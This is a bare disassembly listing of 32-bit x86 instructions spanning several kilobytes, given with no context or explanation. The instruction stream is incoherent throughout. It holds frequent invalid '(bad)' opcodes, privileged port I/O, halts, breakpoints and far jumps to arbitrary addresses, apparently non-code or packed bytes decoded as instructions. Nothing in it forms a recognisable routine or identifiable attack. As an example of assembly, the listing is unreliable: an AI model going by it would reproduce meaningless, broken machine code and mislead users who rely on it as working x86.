  41537a:	inc    ebp
  41537b:	add    dl,BYTE PTR [ecx-0x12]
  41537e:	ret    0x2ed4
  415381:	and    ah,BYTE PTR [ebp+0x5eb66ac7]
  415387:	stc    
  415388:	jb     0x4153cb
  41538a:	out    0xe,eax
  41538c:	inc    ebx
  41538d:	popa   
  41538e:	adc    DWORD PTR [ecx+0x55c76ec],esi
  415394:	mov    esp,0xb655a0a7
  415399:	(bad)  
  41539a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41539b:	xlat   BYTE PTR ds:[ebx]
  41539c:	cli    
  41539d:	mov    al,ds:0x62222dd6
  4153a2:	cli    
  4153a3:	mov    dh,0x17
  4153a5:	test   BYTE PTR [ebp-0x2],al
  4153a8:	dec    ebx
  4153a9:	fdecstp 
  4153ab:	xor    al,0x87
  4153ad:	cld    
  4153ae:	add    DWORD PTR [esi+eiz*4-0x41e27d96],edi
  4153b5:	cmp    ah,dh
  4153b7:	loop   0x4153d1
  4153b9:	sub    eax,0x9c1bb147
  4153be:	xchg   BYTE PTR [edi],dh
  4153c0:	jp     0x41542c
  4153c2:	fneni(8087 only) 
  4153c4:	in     eax,dx
  4153c5:	and    eax,0x53762a
  4153ca:	pop    es
  4153cb:	push   eax
  4153cc:	jb     0x4153c9
  4153ce:	jp     0x41538c
  4153d0:	dec    ebp
  4153d1:	jle    0x41538a
  4153d3:	imul   eax,ebx,0xdef8da35
  4153d9:	shr    DWORD PTR [esi+0x31],1
  4153dc:	(bad)  
  4153dd:	push   edx
  4153de:	mov    al,0xe
  4153e0:	lea    eax,[eax+edi*8-0x5]
  4153e4:	adc    edi,DWORD PTR [edi+edi*8+0x523f2adc]
  4153eb:	mov    dl,0x7d
  4153ed:	mov    ds:0xd8179561,eax
  4153f2:	or     BYTE PTR [esi-0x57],al
  4153f5:	daa    
  4153f6:	and    al,0x12
  4153f8:	rcl    BYTE PTR [ebx+0x6],0x59
  4153fc:	add    eax,0xa82585b8
  415401:	adc    al,0xd7
  415403:	sar    BYTE PTR [ecx],cl
  415405:	inc    ebx
  415406:	dec    edx
  415407:	addr16 jno 0x4153db
  41540a:	jp     0x4153d2
  41540c:	js     0x415467
  41540e:	int3   
  41540f:	mov    eax,ds:0xfe63773d
  415414:	dec    esp
  415415:	inc    ebp
  415416:	ficomp WORD PTR [edi+ebp*2]
  415419:	loopne 0x4153aa
  41541b:	xor    BYTE PTR [ebp-0x5fcc03c7],bl
  415421:	in     al,dx
  415422:	lods   eax,DWORD PTR ds:[esi]
  415423:	jge    0x41544f
  415425:	in     eax,0x4d
  415427:	xor    cl,bh
  415429:	enter  0x50d8,0x7a
  41542d:	into   
  41542e:	ja     0x4153d3
  415430:	adc    eax,0x2aa178aa
  415435:	sub    esi,eax
  415437:	test   ah,bl
  415439:	push   ss
  41543a:	out    dx,eax
  41543b:	popa   
  41543c:	sbb    esp,esp
  41543e:	sar    BYTE PTR [ecx-0x43887b2],cl
  415444:	icebp  
  415445:	sbb    DWORD PTR [ebx-0x52],0x8826a6e8
  41544c:	icebp  
  41544d:	xchg   esi,eax
  41544e:	out    0xa,eax
  415450:	adc    BYTE PTR cs:[edi+0x26],ah
  415454:	pop    ds
  415455:	mov    al,0xb5
  415457:	popa   
  415458:	jbe    0x415409
  41545a:	sbb    DWORD PTR [edx+0x46],edx
  41545d:	sub    DWORD PTR [esi-0x3228a23f],ebp
  415463:	add    bl,BYTE PTR ds:0x98cc6deb
  415469:	sar    BYTE PTR [edx],1
  41546b:	dec    esp
  41546c:	add    ch,BYTE PTR [edi-0x18775aef]
  415472:	mov    ebx,0xe19846fa
  415477:	ret    
  415478:	arpl   cx,sp
  41547a:	adc    eax,0xaac13e08
  41547f:	sahf   
  415480:	inc    eax
  415481:	lock nop
  415483:	or     dh,BYTE PTR [esi+0x46]
  415486:	inc    DWORD PTR [ebp-0x51]
  415489:	push   0xffffffcf
  41548b:	(bad)  [ecx-0xe]
  41548e:	pop    edx
  41548f:	daa    
  415490:	les    edx,FWORD PTR [ebx]
  415492:	and    al,0x8f
  415494:	mov    al,ds:0x37bbb3d0
  415499:	push   esi
  41549a:	imul   ecx,DWORD PTR [ebx-0x45072e04],0x5e
  4154a1:	push   ss
  4154a2:	loopne 0x4154be
  4154a4:	repnz pop esi
  4154a6:	inc    eax
  4154a7:	pop    edx
  4154a8:	sbb    eax,0x6612c268
  4154ad:	push   es
  4154ae:	nop
  4154af:	push   edi
  4154b0:	mov    esi,0x36fa5b83
  4154b5:	fs lock push ss
  4154b8:	ret    
  4154b9:	cdq    
  4154ba:	xchg   esp,eax
  4154bb:	mov    edx,0xd3716906
  4154c0:	push   edi
  4154c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154c2:	and    al,0x95
  4154c4:	xor    al,0xa8
  4154c6:	xlat   BYTE PTR ds:[ebx]
  4154c7:	test   edi,esp
  4154c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ca:	pop    ecx
  4154cb:	add    edx,eax
  4154cd:	stc    
  4154ce:	cmp    DWORD PTR [edx],eax
  4154d0:	mov    eax,0x103cd81c
  4154d5:	mov    eax,ds:0x16581561
  4154da:	pop    ecx
  4154db:	or     esi,esi
  4154dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154de:	pop    ebp
  4154df:	or     BYTE PTR [ecx],dl
  4154e1:	sbb    eax,0x61c65f8c
  4154e6:	pop    ds
  4154e7:	adc    BYTE PTR [edi+0x26],0x82
  4154eb:	pop    esp
  4154ec:	mov    cl,0x87
  4154ee:	adc    bl,BYTE PTR [esi-0x2f6e290d]
  4154f4:	cs ds leave 
  4154f7:	jmp    0x4154c9
  4154f9:	xlat   BYTE PTR ds:[ebx]
  4154fa:	xchg   ebx,eax
  4154fb:	xchg   DWORD PTR [ecx+0x184b7567],edi
  415501:	push   esi
  415502:	mov    ebp,0xf93dd25
  415507:	push   cs
  415508:	fwait
  415509:	adc    bl,0xa9
  41550c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41550d:	and    al,0x94
  41550f:	mov    ebx,0x239f2490
  415514:	or     al,0xca
  415516:	xchg   edx,eax
  415517:	jns    0x4154b1
  415519:	mov    dh,0x24
  41551b:	xor    esi,DWORD PTR [ecx-0x4c9e31fb]
  415521:	mov    edx,0x503c8279
  415526:	es pop edi
  415528:	inc    ebx
  415529:	sti    
  41552a:	ins    DWORD PTR es:[edi],dx
  41552b:	and    bh,BYTE PTR [ebp+0x7cac8367]
  415531:	pop    esp
  415532:	mov    ds:0x922f907,eax
  415537:	inc    edx
  415538:	lds    esp,FWORD PTR [eax+0x21]
  41553b:	mov    DWORD PTR ds:0x9b8c66ef,edx
  415541:	ja     0x4154d6
  415543:	cs sub ch,ch
  415546:	mov    bh,0xef
  415548:	iret   
  415549:	hlt    
  41554a:	in     al,0xf9
  41554c:	jb     0x41558f
  41554e:	adc    DWORD PTR [esi+0x51],0xffffffc1
  415552:	lock sti 
  415554:	cmp    al,BYTE PTR [edi]
  415556:	ss lahf 
  415558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415559:	arpl   WORD PTR [eax+0x3901af48],bx
  41555f:	js     0x4154fb
  415561:	clc    
  415562:	jecxz  0x4155a3
  415564:	xor    eax,0xdb69b663
  415569:	push   esp
  41556a:	daa    
  41556b:	and    BYTE PTR [esp+ebp*2+0x6f],bl
  41556f:	fisub  DWORD PTR [edi+0x61]
  415572:	mov    al,ds:0xea1f0b9f
  415577:	sar    BYTE PTR [edx],1
  415579:	iret   
  41557a:	bound  eax,QWORD PTR [ebx+0x3c]
  41557d:	mov    eax,ds:0x6e954350
  415582:	rol    eax,1
  415584:	cmp    ch,BYTE PTR [ebp-0x71]
  415587:	fimul  DWORD PTR [esi+0xc67b8bb]
  41558d:	shl    BYTE PTR [ebx-0x39],cl
  415590:	and    eax,DWORD PTR [edi+0x63]
  415593:	jno    0x4155c3
  415595:	sti    
  415596:	int    0x94
  415598:	hlt    
  415599:	out    0xdf,eax
  41559b:	in     al,dx
  41559c:	je     0x41559e
  41559e:	and    DWORD PTR [edx],esp
  4155a0:	adc    edx,DWORD PTR [ebp+0x540cb6e4]
  4155a6:	inc    edx
  4155a7:	in     al,0xaa
  4155a9:	icebp  
  4155aa:	into   
  4155ab:	aam    0x41
  4155ad:	mov    BYTE PTR [esi],al
  4155af:	cld    
  4155b0:	es sbb ecx,edi
  4155b3:	sbb    al,BYTE PTR [ebp-0x29]
  4155b6:	jnp    0x4155f2
  4155b8:	cmp    eax,0xb4566136
  4155bd:	inc    edi
  4155be:	lahf   
  4155bf:	adc    dl,0xb9
  4155c2:	cld    
  4155c3:	out    dx,al
  4155c4:	out    dx,eax
  4155c5:	dec    esp
  4155c6:	inc    ecx
  4155c7:	iret   
  4155c8:	(bad)  
  4155c9:	je     0x41556c
  4155cb:	(bad)  
  4155cc:	sbb    al,0xca
  4155ce:	scas   eax,DWORD PTR es:[edi]
  4155cf:	xchg   edi,eax
  4155d0:	xlat   BYTE PTR ds:[ebx]
  4155d1:	mov    al,ds:0x9327ba64
  4155d6:	sub    BYTE PTR [ecx-0x1fc209fa],al
  4155dc:	rol    al,0xd5
  4155df:	rcl    DWORD PTR [edx+0x35],cl
  4155e2:	repnz sbb eax,0xfa12441c
  4155e8:	mov    bl,0x5e
  4155ea:	mov    bh,0x81
  4155ec:	jl     0x415647
  4155ee:	in     al,dx
  4155ef:	push   0x95953624
  4155f4:	pusha  
  4155f5:	idiv   DWORD PTR [ebx-0x6285b42a]
  4155fb:	inc    edi
  4155fc:	retf   
  4155fd:	loope  0x415617
  4155ff:	scas   al,BYTE PTR es:[edi]
  415600:	cmp    BYTE PTR [eax],ah
  415602:	cmp    edx,DWORD PTR [edi]
  415604:	and    DWORD PTR fs:[edx+eax*2-0x2d582d94],edi
  41560c:	addr16 aam 0x24
  41560f:	mov    ah,0x4c
  415611:	cmp    BYTE PTR [edi-0x1940be4e],dl
  415617:	mov    dl,0x79
  415619:	stc    
  41561a:	popa   
  41561b:	loope  0x415696
  41561d:	fadd   st,st(1)
  41561f:	push   ds
  415620:	outs   dx,BYTE PTR ds:[esi]
  415621:	les    ecx,FWORD PTR [eax-0x24]
  415624:	dec    edx
  415625:	(bad)  
  415626:	gs (bad) 
  415628:	mov    cl,0x58
  41562a:	add    BYTE PTR [ecx],cl
  41562c:	int3   
  41562d:	loope  0x4155c6
  41562f:	mov    ch,0x3c
  415631:	xchg   ebx,eax
  415632:	jae    0x4156a6
  415634:	outs   dx,BYTE PTR ds:[esi]
  415635:	test   al,0xa6
  415637:	cwde   
  415638:	fst    DWORD PTR [eax]
  41563a:	cmp    al,0xbe
  41563c:	sub    edi,DWORD PTR [edi+eiz*4+0x33]
  415640:	icebp  
  415641:	vpaddusb ymm7,ymm0,YMMWORD PTR ds:0x936d561c
  415649:	mov    eax,0xdf76bbe0
  41564e:	scas   al,BYTE PTR es:[edi]
  41564f:	fdivr  QWORD PTR [edx-0xfa0fbda]
  415655:	icebp  
  415656:	fidiv  DWORD PTR [eax-0x370be5b5]
  41565c:	xor    BYTE PTR [edx+esi*1],0xa4
  415660:	and    al,0x13
  415662:	scas   eax,DWORD PTR es:[edi]
  415663:	pop    esi
  415664:	mov    ds:0x39a32b2d,al
  415669:	adc    ah,0x8d
  41566c:	inc    eax
  41566d:	lahf   
  41566e:	fnsave [edi+0x15]
  415671:	jb     0x415619
  415673:	mov    ss,eax
  415675:	push   cs
  415676:	rcl    dh,cl
  415678:	pop    ecx
  415679:	xchg   ebp,eax
  41567a:	mov    edi,0xf175949e
  41567f:	xchg   BYTE PTR [edx-0x7e24df76],dl
  415685:	adc    dl,BYTE PTR [ebp-0x3f]
  415688:	inc    eax
  415689:	test   BYTE PTR [eax+0x38aa6b40],ch
  41568f:	pop    edx
  415690:	or     eax,DWORD PTR [ebx+0x58]
  415693:	mov    ecx,0xc5d19a0e
  415698:	cmp    ebx,ecx
  41569a:	mov    ds:0x6b56954d,al
  41569f:	lea    esi,[esi+0x1ef95a08]
  4156a5:	je     0x415715
  4156a7:	inc    edi
  4156a8:	lods   eax,DWORD PTR ds:[esi]
  4156a9:	jmp    0xe6be0c5
  4156ae:	add    DWORD PTR [edx],ecx
  4156b0:	lea    edi,[ecx+eax*2]
  4156b3:	pop    ebx
  4156b4:	call   0xfd03c109
  4156b9:	popf   
  4156ba:	test   eax,0xc5fe1d02
  4156bf:	xor    edi,DWORD PTR [edi-0x2a1ebb8e]
  4156c5:	mov    ebp,0xc87ab0da
  4156ca:	stos   BYTE PTR es:[edi],al
  4156cb:	sub    DWORD PTR [ebx-0x6730b628],0xffffff96
  4156d2:	pop    edi
  4156d3:	inc    eax
  4156d4:	mov    ebp,edi
  4156d6:	aas    
  4156d7:	dec    edx
  4156d8:	xor    ebp,esi
  4156da:	cdq    
  4156db:	sub    eax,0x3e4eda74
  4156e0:	mov    edx,DWORD PTR [edx]
  4156e2:	inc    ebp
  4156e3:	pop    eax
  4156e4:	xchg   esi,eax
  4156e5:	jge    0x41568e
  4156e7:	cmc    
  4156e8:	xor    edi,ecx
  4156ea:	js     0x4156f5
  4156ec:	repz mov eax,DWORD PTR [esi]
  4156ef:	inc    esp
  4156f0:	fadd   QWORD PTR [ebx+esi*2+0x55]
  4156f4:	aad    0xc4
  4156f6:	int    0x2c
  4156f8:	dec    ebp
  4156f9:	add    BYTE PTR [edx+ebx*2+0x17],bh
  4156fd:	in     al,0x5
  4156ff:	mov    eax,0xb9f09de1
  415704:	repz mov bl,0x99
  415707:	pop    es
  415708:	in     al,dx
  415709:	sahf   
  41570a:	bound  eax,QWORD PTR [edx-0x6e]
  41570d:	cmc    
  41570e:	bound  esp,QWORD PTR [ecx]
  415710:	sub    al,0xf2
  415712:	stos   BYTE PTR es:[edi],al
  415713:	dec    ecx
  415714:	cmp    ah,dl
  415716:	jmp    0xd52107cb
  41571b:	call   0x8dea:0x7bb9ccfa
  415722:	mov    edi,0x6995505f
  415727:	pop    edi
  415728:	dec    ebx
  415729:	inc    ebp
  41572a:	sar    BYTE PTR [ebx+eiz*8-0x70e1e411],1
  415731:	mov    WORD PTR [esi-0x3b38afa7],gs
  415737:	adc    al,0x55
  415739:	pop    ss
  41573a:	xor    al,BYTE PTR [esi+0x75]
  41573d:	mov    ecx,0xa0eb0479
  415742:	pop    ss
  415743:	(bad)  
  415744:	jo     0x415725
  415746:	jo     0x415704
  415748:	sub    eax,0xb0f8fb28
  41574d:	stos   DWORD PTR es:[edi],eax
  41574e:	gs cmc 
  415750:	adc    ebp,DWORD PTR [edi+0x69]
  415753:	push   ss
  415754:	daa    
  415755:	scas   eax,DWORD PTR es:[edi]
  415756:	pop    edx
  415757:	ret    
  415758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415759:	and    al,0xef
  41575b:	and    al,0xfe
  41575d:	(bad)  
  41575e:	xor    DWORD PTR [ecx],ebx
  415760:	(bad)  
  415761:	out    dx,eax
  415762:	sub    al,0x46
  415764:	push   ebx
  415765:	or     esp,DWORD PTR [eax+0x3f1827b6]
  41576b:	dec    edx
  41576c:	inc    ecx
  41576d:	sub    eax,0x4907c067
  415772:	repnz pushw cs
  415775:	loope  0x4157df
  415777:	cmovae edx,eax
  41577a:	dec    esp
  41577b:	push   ebx
  41577c:	lds    edx,FWORD PTR [eax+0x3e498d71]
  415782:	xchg   edx,eax
  415783:	dec    edi
  415784:	jmp    0x4157bd
  415786:	inc    ebp
  415787:	outs   dx,BYTE PTR ds:[esi]
  415788:	pop    esi
  415789:	push   0x9f9281b4
  41578e:	sbb    eax,0x9eb03553
  415793:	pop    esi
  415794:	ret    0xba70
  415797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415798:	push   ebp
  415799:	mov    edi,0x448744f7
  41579e:	pop    ebp
  41579f:	daa    
  4157a0:	stos   BYTE PTR es:[edi],al
  4157a1:	fldcw  WORD PTR [edi]
  4157a3:	lahf   
  4157a4:	(bad)  
  4157a5:	pushf  
  4157a6:	cmp    BYTE PTR [eax-0x2943a7c2],0x6b
  4157ad:	xor    DWORD PTR [ecx+0x667d394],eax
  4157b3:	mov    esp,0x5a8460ad
  4157b8:	xchg   ebp,eax
  4157b9:	and    edi,ebp
  4157bb:	add    al,0xee
  4157bd:	repz pop es
  4157bf:	sub    edx,DWORD PTR [esi]
  4157c1:	mov    cl,0x37
  4157c3:	fcom   st(4)
  4157c5:	pop    esi
  4157c6:	enter  0xef86,0x2
  4157ca:	popa   
  4157cb:	dec    esi
  4157cc:	jge    0x4157b2
  4157ce:	inc    ebp
  4157cf:	gs in  eax,dx
  4157d1:	jecxz  0x4157b9
  4157d3:	aas    
  4157d4:	mov    dl,0x2e
  4157d6:	jmp    0x3fc8:0xb82b8c23
  4157dd:	xchg   ebx,eax
  4157de:	add    al,0xfe
  4157e0:	js     0x415769
  4157e2:	jle    0x41580c
  4157e4:	push   ss
  4157e5:	mov    WORD PTR [eax-0x149cad96],ss
  4157eb:	dec    ecx
  4157ec:	xchg   esp,eax
  4157ed:	int    0x5d
  4157ef:	repnz and ch,bh
  4157f2:	loop   0x4157d5
  4157f4:	add    DWORD PTR [eax+0x16],edi
  4157f7:	fimul  WORD PTR [edi]
  4157f9:	pop    esi
  4157fa:	or     al,0xc5
  4157fc:	into   
  4157fd:	je     0x4157a8
  4157ff:	fist   DWORD PTR [edi-0x3a74795d]
  415805:	sub    BYTE PTR [ebp+0x4e5636fd],bh
  41580b:	ret    0x31b6
  41580e:	cmp    DWORD PTR [esi+0x23],esp
  415811:	and    cl,ah
  415813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415814:	addr16 and ebp,ebp
  415817:	push   ss
  415818:	sub    ebp,ebp
  41581a:	pop    ecx
  41581b:	inc    ebp
  41581c:	dec    ecx
  41581d:	sbb    eax,0xb66919e7
  415822:	rol    bl,cl
  415824:	test   al,0x89
  415827:	icebp  
  415828:	push   0xffffffe9
  41582a:	sbb    al,0x84
  41582c:	or     BYTE PTR [eax-0x29aa4450],0x45
  415833:	aad    0x38
  415835:	cwde   
  415836:	pushf  
  415837:	imul   ebx,edi,0xffffffad
  41583a:	ss icebp 
  41583c:	fisubr WORD PTR [edi+0x79dae93c]
  415842:	or     BYTE PTR [edi-0x80],0x7a
  415846:	inc    eax
  415847:	adc    eax,0xe11c9682
  41584c:	xor    DWORD PTR [edx-0x37ca6185],esi
  415852:	addr16 daa 
  415854:	(bad)  
  415855:	rol    BYTE PTR [edi],cl
  415857:	cdq    
  415858:	outs   dx,DWORD PTR ds:[esi]
  415859:	dec    ebx
  41585a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41585b:	fsubr  QWORD PTR [ebx-0x623e40b2]
  415861:	nop
  415862:	in     al,0xea
  415864:	xor    eax,0x9c5553fd
  415869:	pop    ecx
  41586a:	pop    esi
  41586b:	jecxz  0x415830
  41586d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41586e:	inc    esi
  41586f:	adc    eax,0x26199435
  415874:	sub    eax,0xa9e2d5eb
  415879:	retf   
  41587a:	xchg   esi,eax
  41587b:	jno    0x41585d
  41587d:	mov    ah,0x22
  41587f:	les    eax,FWORD PTR [edx-0x573898d6]
  415885:	gs jmp 0x415826
  415888:	retf   0x1a3
  41588b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41588c:	xor    esp,esi
  41588e:	in     al,dx
  41588f:	xchg   edi,eax
  415890:	mov    esp,edx
  415892:	xor    eax,0xc2a7eab5
  415897:	int3   
  415898:	fdivr  QWORD PTR [esi-0x23035826]
  41589e:	(bad)  
  41589f:	in     eax,dx
  4158a0:	mov    bh,0xbd
  4158a2:	pop    eax
  4158a3:	dec    ebx
  4158a4:	stos   BYTE PTR es:[edi],al
  4158a5:	jg     0x415885
  4158a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a8:	mov    edi,0x4555f027
  4158ad:	push   esp
  4158ae:	inc    ebp
  4158af:	sub    eax,0x6362f17f
  4158b4:	fs and eax,0xeb190d09
  4158ba:	cmp    DWORD PTR [ebx],eax
  4158bc:	mov    ds:0xa26edad1,eax
  4158c1:	pop    es
  4158c2:	and    al,0xbc
  4158c4:	shl    BYTE PTR [ebx],1
  4158c6:	sbb    BYTE PTR [edi],0x8f
  4158c9:	imul   esp,DWORD PTR [edx+ebp*4+0x2270ce83],0xffffffa8
  4158d1:	test   eax,0x8544969c
  4158d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d7:	jl     0x415888
  4158d9:	das    
  4158da:	mov    ds:0x734de8d3,eax
  4158df:	jne    0x415863
  4158e1:	or     al,BYTE PTR [ebx-0x12]
  4158e4:	sub    DWORD PTR [edx+eiz*1+0x1f439924],0xc1ba2e0
  4158ef:	adc    BYTE PTR [ecx-0x605c8147],ah
  4158f5:	xchg   BYTE PTR [ebp-0x32bfe600],ch
  4158fb:	arpl   dx,cx
  4158fd:	xchg   BYTE PTR [ecx+0x67d57a75],dl
  415903:	inc    ebp
  415904:	retf   0x4c2e
  415907:	mov    ah,0x5f
  415909:	mov    ds:0x30a76b0f,al
  41590e:	(bad)  
  41590f:	dec    esp
  415910:	retf   
  415911:	dec    esi
  415912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415913:	sbb    cl,BYTE PTR [edi-0x27]
  415916:	jmp    0x83193fa5
  41591b:	push   ds
  41591c:	sbb    eax,0x91d7c658
  415921:	shl    DWORD PTR [ebp-0x1a],1
  415924:	out    dx,al
  415925:	ds pushf 
  415927:	loopne 0x41599b
  415929:	js     0x415993
  41592b:	and    eax,0xba7bd2d5
  415930:	or     eax,DWORD PTR [edi-0x3f]
  415933:	in     eax,dx
  415934:	outs   dx,DWORD PTR ds:[esi]
  415935:	jmp    0xeed5:0x5f949aa8
  41593c:	xchg   ecx,eax
  41593d:	xchg   BYTE PTR [eax+0x6c],bh
  415940:	or     BYTE PTR [ecx+0x40d9ee6f],ch
  415946:	and    al,0x1a
  415948:	and    al,BYTE PTR ds:0xb944a1c
  41594e:	dec    ebx
  41594f:	inc    ebp
  415950:	xor    BYTE PTR [edi-0x58],dh
  415953:	jmp    0x41595e
  415955:	int3   
  415956:	jg     0x41595d
  415958:	mov    BYTE PTR [ebx],0x0
  41595b:	pop    es
  41595c:	and    al,0x15
  41595e:	xor    DWORD PTR [ecx+0x19],esi
  415961:	jl     0x415928
  415963:	bound  ecx,QWORD PTR [eax-0x54]
  415966:	adc    bh,BYTE PTR [eax+0x13]
  415969:	cdq    
  41596a:	pop    edx
  41596c:	inc    ebx
  41596d:	cmp    BYTE PTR ds:0x889109d8,bh
  415973:	cmp    al,0x33
  415975:	test   eax,0xe9a18c67
  41597a:	sahf   
  41597b:	ds dec ebp
  41597d:	ret    0x68d6
  415980:	lock lods eax,DWORD PTR ds:[esi]
  415982:	sub    cl,BYTE PTR [ebx+0x51]
  415985:	sbb    eax,0x5d16c410
  41598a:	push   edx
  41598b:	cmp    cl,dl
  41598d:	outs   dx,BYTE PTR ds:[esi]
  41598e:	retf   
  41598f:	jo     0x4159d9
  415991:	scas   al,BYTE PTR es:[edi]
  415992:	or     BYTE PTR [bp+di],bl
  415995:	mov    al,ds:0xc9bf0590
  41599a:	aam    0xa2
  41599c:	retf   0x9e45
  41599f:	iret   
  4159a0:	jbe    0x415972
  4159a2:	(bad)  
  4159a3:	xchg   ebx,eax
  4159a4:	call   0x9cef:0xd2499b87
  4159ab:	sbb    ch,al
  4159ad:	mov    ch,0x3d
  4159af:	xor    BYTE PTR [eax],ch
  4159b1:	pop    es
  4159b2:	dec    edx
  4159b3:	xchg   ebx,eax
  4159b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159b5:	inc    ecx
  4159b6:	mov    esi,0xa8c504b
  4159bb:	push   es
  4159bc:	fld    QWORD PTR [ecx-0x45]
  4159bf:	mov    eax,0x20400e52
  4159c4:	cdq    
  4159c5:	packssdw mm6,QWORD PTR [esp+esi*1]
  4159c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159ca:	adc    al,bl
  4159cc:	push   ebp
  4159cd:	ror    BYTE PTR [ebx+0x53],cl
  4159d0:	jo     0x415a07
  4159d2:	mov    DWORD PTR [eax],0xea21fdaa
  4159d8:	sbb    BYTE PTR [eax-0x77],al
  4159db:	push   edx
  4159dc:	enter  0x1d0c,0x90
  4159e0:	xchg   ebx,eax
  4159e1:	sbb    eax,edx
  4159e3:	enter  0x97a6,0xe7
  4159e7:	and    ecx,edi
  4159e9:	adc    BYTE PTR ds:0x1e94ed5a,al
  4159ef:	or     eax,0x38d03a96
  4159f4:	mov    ah,0x92
  4159f6:	(bad)  [ecx+0x31]
  4159f9:	add    esi,DWORD PTR [edi-0x65f1d8af]
  4159ff:	sbb    al,0x44
  415a01:	sahf   
  415a02:	iret   
  415a03:	mov    eax,ds:0x8df72a9e
  415a08:	in     eax,0xd8
  415a0a:	mov    ds,WORD PTR [ecx+0x27]
  415a0d:	call   0x8e2d:0x8492dc23
  415a14:	fcom   DWORD PTR [ebx]
  415a16:	mov    eax,ds:0x753db655
  415a1b:	ss pop esi
  415a1d:	add    ecx,ebp
  415a1f:	inc    ebp
  415a20:	mov    esi,0x9ab0b2c8
  415a25:	call   0x2d09622b
  415a2a:	xor    esi,DWORD PTR [ecx]
  415a2c:	leave  
  415a2d:	in     eax,0xf6
  415a2f:	adc    ebp,DWORD PTR [ecx+0x12]
  415a32:	xchg   esi,eax
  415a33:	add    esp,eax
  415a35:	test   BYTE PTR [ecx-0x5ef6f7fa],0x34
  415a3c:	test   DWORD PTR [esi+ebp*8],edx
  415a3f:	inc    esp
  415a40:	test   eax,0x12fb1c40
  415a45:	adc    DWORD PTR [esi],edi
  415a47:	dec    BYTE PTR [ebx]
  415a49:	push   ebx
  415a4b:	(bad)  
  415a4c:	push   edx
  415a4d:	adc    eax,0x3f45cd21
  415a52:	enter  0xe4cf,0x66
  415a56:	xchg   esp,eax
  415a57:	aaa    
  415a58:	int    0x54
  415a5a:	pusha  
  415a5b:	sbb    BYTE PTR [edx+0x6fc6a812],cl
  415a61:	movzx  edi,al
  415a64:	(bad)  
  415a65:	popa   
  415a66:	stc    
  415a67:	lds    eax,FWORD PTR [ebx+0x19]
  415a6a:	and    BYTE PTR [ebx],dh
  415a6c:	mov    eax,0x53cf42cf
  415a71:	pop    ds
  415a72:	push   eax
  415a73:	scas   al,BYTE PTR es:[edi]
  415a74:	sub    DWORD PTR [eax+0x58],eax
  415a77:	adc    bl,BYTE PTR [esi]
  415a79:	lock mov edx,0xce68053d
  415a7f:	rcr    DWORD PTR [ebp+0x2e59d2ac],cl
  415a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a86:	dec    ecx
  415a87:	stos   DWORD PTR es:[edi],eax
  415a88:	clc    
  415a89:	jno    0x415a4e
  415a8b:	mov    edx,edi
  415a8d:	mov    esi,0xc4feaa6f
  415a92:	je     0x415a94
  415a94:	xor    dl,cl
  415a96:	repnz lods al,BYTE PTR ds:[esi]
  415a98:	adc    al,0xb7
  415a9a:	push   ds
  415a9b:	jmp    0xaf3d:0x9d12887d
  415aa2:	(bad)  
  415aa3:	mov    DWORD PTR [ebp+0x4a0c87eb],esp
  415aa9:	push   esi
  415aaa:	cmc    
  415aab:	jge    0x415afb
  415aad:	dec    ecx
  415aae:	mov    DWORD PTR [ecx],edi
  415ab0:	inc    esp
  415ab1:	or     bh,BYTE PTR [edx]
  415ab3:	inc    ebp
  415ab4:	and    bh,ch
  415ab6:	retf   
  415ab7:	inc    ecx
  415ab8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  415aba:	lock pop edx
  415abc:	adc    edi,DWORD PTR [eax-0xd8adb8b]
  415ac2:	mov    edi,0x7f6f6474
  415ac7:	jno    0x415af0
  415ac9:	inc    ecx
  415aca:	ret    
  415acb:	lea    edi,ds:0x510495a4
  415ad1:	hlt    
  415ad2:	pop    edx
  415ad3:	sub    BYTE PTR [ebx+0x7],dl
  415ad6:	pop    es
  415ad7:	adc    DWORD PTR [ebx+eiz*2-0x3fe31ae2],edx
  415ade:	pop    ss
  415adf:	push   edx
  415ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae1:	test   eax,0x3c76cc48
  415ae6:	cli    
  415ae7:	out    0xe5,eax
  415ae9:	cld    
  415aea:	jnp    0x415ad0
  415aec:	mov    ds:0x14352f59,eax
  415af1:	sbb    DWORD PTR [ecx-0x35],ebp
  415af4:	inc    esp
  415af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415af6:	out    0xd7,al
  415af8:	cmp    edi,DWORD PTR [edi]
  415afa:	push   ds
  415afb:	mov    edx,0x1a26ddbb
  415b00:	dec    edx
  415b01:	(bad)  
  415b02:	or     eax,0xee4300bd
  415b07:	push   0x95e91918
  415b0c:	xchg   esi,eax
  415b0d:	push   ss
  415b0e:	(bad)  
  415b0f:	mov    WORD PTR [ebp+0x55],?
  415b12:	pushf  
  415b13:	call   0xe318bd3c
  415b18:	jmp    0xcf73:0x724e6108
  415b1f:	fwait
  415b20:	xchg   DWORD PTR [edx],esp
  415b22:	fdivr  DWORD PTR [ecx+esi*2]
  415b25:	daa    
  415b26:	mov    esi,0xdb164cb7
  415b2b:	in     eax,dx
  415b2c:	xchg   esi,eax
  415b2d:	aas    
  415b2e:	test   ebp,edx
  415b30:	mov    ds,ebp
  415b32:	or     al,0xc
  415b34:	sbb    al,0xab
  415b36:	or     eax,0x87d9ebf5
  415b3b:	sub    edx,edx
  415b3d:	js     0x415b3d
  415b3f:	push   ebx
